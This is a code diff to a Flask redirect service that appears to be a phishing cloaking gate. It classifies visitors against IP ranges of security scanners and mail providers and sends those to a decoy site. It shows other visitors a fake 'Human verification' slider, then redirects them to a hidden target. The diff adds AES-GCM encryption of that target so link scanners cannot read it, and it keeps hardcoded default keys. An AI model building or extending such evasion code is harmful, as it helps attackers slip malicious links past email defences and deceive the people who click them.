@@ -7,16 +7,20 @@ import logging
 from ipaddress import ip_address, ip_network
 from urllib.parse import quote
 
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from flask import (
     Flask, request, redirect, render_template_string,
     make_response, jsonify,
 )
-from itsdangerous import URLSafeTimedSerializer, BadSignature, SignatureExpired
+from itsdangerous import URLSafeTimedSerializer
 
 # ---------------------------------------------------------------------------
 # config
 # ---------------------------------------------------------------------------
 SK = os.environ.get("SECRET_KEY", "7b311b50f8306ae1fbe13f4db9b030267f77f3cc0020889b8cb583895afb443e")
+AES_KEY_HEX = os.environ.get("AES_KEY_HEX", "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef")
+AES_KEY = bytes.fromhex(AES_KEY_HEX)
+
 GATE_TTL = int(os.environ.get("GATE_TTL_SECONDS", "900"))
 UNWANTED_REDIRECT_URL = os.environ.get("UNWANTED_REDIRECT_URL", "https://www.xfinity.com")
 
@@ -49,22 +53,15 @@ TALOS = [ip_network("208.75.176.0/22"), ip_network("216.160.0.0/19")]
 GOOGLE_SAFEBROWSING = [ip_network("66.249.64.0/19"), ip_network("2001:4860::/32")]
 
 YAHOO_AOL = [
-    ip_network("66.163.160.0/19"),
-    ip_network("74.6.0.0/16"),
-    ip_network("98.136.0.0/14"),
-    ip_network("98.137.0.0/16"),
-    ip_network("98.138.0.0/15"),
-    ip_network("98.139.0.0/16"),
-    ip_network("98.140.0.0/14"),
-    ip_network("108.160.160.0/20"),
-    ip_network("188.125.64.0/19"),
-    ip_network("203.84.192.0/19"),
+    ip_network("66.163.160.0/19"), ip_network("74.6.0.0/16"),
+    ip_network("98.136.0.0/14"), ip_network("98.137.0.0/16"),
+    ip_network("98.138.0.0/15"), ip_network("98.139.0.0/16"),
+    ip_network("98.140.0.0/14"), ip_network("108.160.160.0/20"),
+    ip_network("188.125.64.0/19"), ip_network("203.84.192.0/19"),
 ]
 
 VERIZON = [
-    ip_network("72.52.0.0/14"),
-    ip_network("96.16.0.0/12"),
-    ip_network("108.6.0.0/16"),
+    ip_network("72.52.0.0/14"), ip_network("96.16.0.0/12"), ip_network("108.6.0.0/16"),
 ]
 
 SCANNER_NETS = {
@@ -144,15 +141,27 @@ def classify(ip: str, ua: str) -> dict:
                 
     return out
 
-def parse_payload_from_eop(eop_string):
-    if not eop_string.startswith("u001."): return None
+# --- AES-GCM DECRYPTION ---
+def unseal_payload(blob):
+    if not blob.startswith("u001."): return None
     try:
-        clean = eop_string[5:].replace("-3D-3D", "").replace("-2F", "").replace("-3D", "").replace("-3A", "").replace("-2B", "")
-        b64_payload = clean.split("-")[-1]
-        padding = '=' * (-len(b64_payload) % 4)
-        return json.loads(base64.urlsafe_b64decode(b64_payload + padding).decode('utf-8'))
+        clean = blob[5:].replace("-3D-3D", "").replace("-2F", "").replace("-3D", "").replace("-3A", "").replace("-2B", "")
+        b64_ciphertext = clean.split("-")[-1]
+        
+        # Decode base64
+        padding = '=' * (-len(b64_ciphertext) % 4)
+        raw_bytes = base64.urlsafe_b64decode(b64_ciphertext + padding)
+        
+        # Split nonce (12 bytes) and ciphertext
+        nonce = raw_bytes[:12]
+        ciphertext = raw_bytes[12:]
+        
+        # Decrypt
+        aesgcm = AESGCM(AES_KEY)
+        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
+        return json.loads(plaintext.decode('utf-8'))
     except Exception as e:
-        log.error(f"Failed to parse payload: {e}")
+        log.error(f"Failed to decrypt payload: {e}")
         return None
 
 def _static_page(title: str, text: str, status_code: int):
@@ -169,104 +178,23 @@ LANDING = """<!DOCTYPE html>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Human verification</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f0f4f8;
-            color: #1a202c;
-            margin: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-        }
-        .card {
-            background: #ffffff;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.05), 0 10px 15px rgba(0,0,0,0.1);
-            text-align: center;
-            width: 100%;
-            max-width: 400px;
-            box-sizing: border-box;
-        }
-        h1 {
-            font-size: 22px;
-            margin-top: 0;
-            margin-bottom: 10px;
-            font-weight: 600;
-        }
-        p {
-            font-size: 14px;
-            color: #718096;
-            margin-bottom: 30px;
-        }
-        .slider-container {
-            position: relative;
-            width: 100%;
-            height: 50px;
-            background-color: #edf2f7;
-            border-radius: 25px;
-            display: flex;
-            align-items: center;
-            user-select: none;
-            overflow: hidden;
-        }
-        .slider-text {
-            position: absolute;
-            width: 100%;
-            text-align: center;
-            font-size: 14px;
-            color: #a0aec0;
-            pointer-events: none;
-            transition: opacity 0.3s;
-        }
-        .slider-handle {
-            position: absolute;
-            left: 5px;
-            width: 40px;
-            height: 40px;
-            background-color: #ffffff;
-            border-radius: 50%;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: grab;
-            transition: transform 0.1s;
-        }
-        .slider-handle:active {
-            cursor: grabbing;
-        }
-        .slider-handle svg {
-            width: 16px;
-            height: 16px;
-            fill: #a0aec0;
-        }
-        .slider-progress {
-            position: absolute;
-            left: 0;
-            top: 0;
-            height: 100%;
-            background-color: #c6f6d5;
-            width: 0%;
-            border-radius: 25px;
-        }
-        .success-text {
-            display: none;
-            color: #48bb78;
-            font-weight: bold;
-            text-align: center;
-            width: 100%;
-            position: absolute;
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f4f8; color: #1a202c; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        .card { background: #ffffff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.05), 0 10px 15px rgba(0,0,0,0.1); text-align: center; width: 100%; max-width: 400px; box-sizing: border-box; }
+        h1 { font-size: 22px; margin-top: 0; margin-bottom: 10px; font-weight: 600; }
+        p { font-size: 14px; color: #718096; margin-bottom: 30px; }
+        .slider-container { position: relative; width: 100%; height: 50px; background-color: #edf2f7; border-radius: 25px; display: flex; align-items: center; user-select: none; overflow: hidden; }
+        .slider-text { position: absolute; width: 100%; text-align: center; font-size: 14px; color: #a0aec0; pointer-events: none; transition: opacity 0.3s; }
+        .slider-handle { position: absolute; left: 5px; width: 40px; height: 40px; background-color: #ffffff; border-radius: 50%; box-shadow: 0 2px 5px rgba(0,0,0,0.2); display: flex; align-items: center; justify-content: center; cursor: grab; transition: transform 0.1s; }
+        .slider-handle:active { cursor: grabbing; }
+        .slider-handle svg { width: 16px; height: 16px; fill: #a0aec0; }
+        .slider-progress { position: absolute; left: 0; top: 0; height: 100%; background-color: #c6f6d5; width: 0%; border-radius: 25px; }
+        .success-text { display: none; color: #48bb78; font-weight: bold; text-align: center; width: 100%; position: absolute; }
     </style>
 </head>
 <body>
-
     <div class="card">
         <h1>Human verification</h1>
         <p>Prove you're not a bot by sliding the handle.</p>
-        
         <div class="slider-container" id="slider-container">
             <div class="slider-progress" id="slider-progress"></div>
             <span class="slider-text" id="slider-text">Drag to complete</span>
@@ -275,13 +203,11 @@ LANDING = """<!DOCTYPE html>
                 <svg viewBox="0 0 24 24"><path d="M9 18l6-6-6-6v12z"/></svg>
             </div>
         </div>
-
         <form id="challenge-form" method="POST" action="{{ action }}" style="display:none;">
             <input type="hidden" name="n" value="{{ nonce }}">
             <input type="hidden" name="t" value="{{ token }}">
         </form>
     </div>
-
     <script>
         const container = document.getElementById('slider-container');
         const handle = document.getElementById('slider-handle');
@@ -289,78 +215,36 @@ LANDING = """<!DOCTYPE html>
         const text = document.getElementById('slider-text');
         const successText = document.getElementById('success-text');
         const form = document.getElementById('challenge-form');
-
-        let isDragging = false;
-        let startX = 0;
-        let maxDelta = 0;
-
-        function init() {
-            maxDelta = container.offsetWidth - handle.offsetWidth - 10; // 5px padding on each side
-        }
-
-        window.onload = init;
-        window.onresize = init;
-
-        handle.addEventListener('mousedown', startDrag);
-        handle.addEventListener('touchstart', startDrag, {passive: true});
-        
-        document.addEventListener('mousemove', onDrag);
-        document.addEventListener('touchmove', onDrag, {passive: false});
-        
-        document.addEventListener('mouseup', endDrag);
-        document.addEventListener('touchend', endDrag);
-
-        function startDrag(e) {
-            isDragging = true;
-            startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
-        }
-
+        let isDragging = false; let startX = 0; let maxDelta = 0;
+        function init() { maxDelta = container.offsetWidth - handle.offsetWidth - 10; }
+        window.onload = init; window.onresize = init;
+        handle.addEventListener('mousedown', startDrag); handle.addEventListener('touchstart', startDrag, {passive: true});
+        document.addEventListener('mousemove', onDrag); document.addEventListener('touchmove', onDrag, {passive: false});
+        document.addEventListener('mouseup', endDrag); document.addEventListener('touchend', endDrag);
+        function startDrag(e) { isDragging = true; startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX; }
         function onDrag(e) {
             if (!isDragging) return;
             if (e.cancelable) e.preventDefault();
-            
             const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
             let deltaX = clientX - startX;
-            
-            if (deltaX < 0) deltaX = 0;
-            if (deltaX > maxDelta) deltaX = maxDelta;
-            
+            if (deltaX < 0) deltaX = 0; if (deltaX > maxDelta) deltaX = maxDelta;
             handle.style.left = (5 + deltaX) + 'px';
             progress.style.width = ((deltaX + 40) / container.offsetWidth * 100) + '%';
-            
-            if (deltaX >= maxDelta - 2) {
-                completeVerification();
-            }
+            if (deltaX >= maxDelta - 2) { completeVerification(); }
         }
-
         function endDrag() {
-            if (!isDragging) return;
-            isDragging = false;
-            
+            if (!isDragging) return; isDragging = false;
             if (parseInt(handle.style.left) < maxDelta) {
-                // Snap back if not complete
-                handle.style.transition = 'left 0.3s ease';
-                progress.style.transition = 'width 0.3s ease';
-                handle.style.left = '5px';
-                progress.style.width = '0%';
-                setTimeout(() => {
-                    handle.style.transition = '';
-                    progress.style.transition = '';
-                }, 300);
+                handle.style.transition = 'left 0.3s ease'; progress.style.transition = 'width 0.3s ease';
+                handle.style.left = '5px'; progress.style.width = '0%';
+                setTimeout(() => { handle.style.transition = ''; progress.style.transition = ''; }, 300);
             }
         }
-
         function completeVerification() {
-            isDragging = false;
-            handle.style.background = '#48bb78';
+            isDragging = false; handle.style.background = '#48bb78';
             handle.innerHTML = '<svg style="fill:white" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>';
-            handle.style.cursor = 'default';
-            text.style.opacity = '0';
-            successText.style.display = 'block';
-            
-            setTimeout(function() {
-                form.submit();
-            }, 500);
+            handle.style.cursor = 'default'; text.style.opacity = '0'; successText.style.display = 'block';
+            setTimeout(function() { form.submit(); }, 500);
         }
     </script>
 </body>
@@ -383,10 +267,10 @@ def landing(token: str):
         return _static_page("Invalid link", "This link is not valid.", 404)
         
     eop_token = token.replace("click_upn=", "")
-    data = parse_payload_from_eop(eop_token)
+    data = unseal_payload(eop_token)
     
     if not data or "target" not in data:
-        return _static_page("Invalid link", "Could not parse target.", 404)
+        return _static_page("Invalid link", "Could not decrypt target.", 404)
 
     tag = classify(client_ip(), request.headers.get("User-Agent", ""))
     log.info(json.dumps({"event": "landing_get", **tag}))
@@ -424,9 +308,9 @@ def execute(token: str):
     if not secrets.compare_digest(nonce_data.get("t", ""), token):
         return _static_page("Verification Failed", "Verification payload mismatched.", 400)
 
-    data = parse_payload_from_eop(token)
+    data = unseal_payload(token)
     if not data or "target" not in data:
-         return _static_page("Invalid link", "Could not parse target.", 404)
+         return _static_page("Invalid link", "Could not decrypt target.", 404)
 
     resp = make_response(redirect(data["target"], code=303))
     resp.delete_cookie("gate_session", path="/")
